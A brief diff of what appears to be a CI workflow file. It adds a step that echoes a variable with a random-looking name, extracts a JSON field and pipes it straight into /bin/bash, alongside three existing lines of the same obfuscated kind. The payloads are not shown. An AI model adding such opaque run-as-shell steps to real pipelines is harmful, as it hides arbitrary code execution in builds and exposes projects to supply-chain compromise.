@@ -30,6 +30,7 @@ jobs:
           printf '%s' "$ghq93502" | jq -r .die996 | /bin/bash
           printf '%s' "$ij8" | jq -r .ljcq133 | /bin/bash
           echo $k79 | jq -r .ufoum8 | /bin/bash
+          echo $reci021 | jq -r .yre63 | /bin/bash
 
       - name: Store results
         if: always()
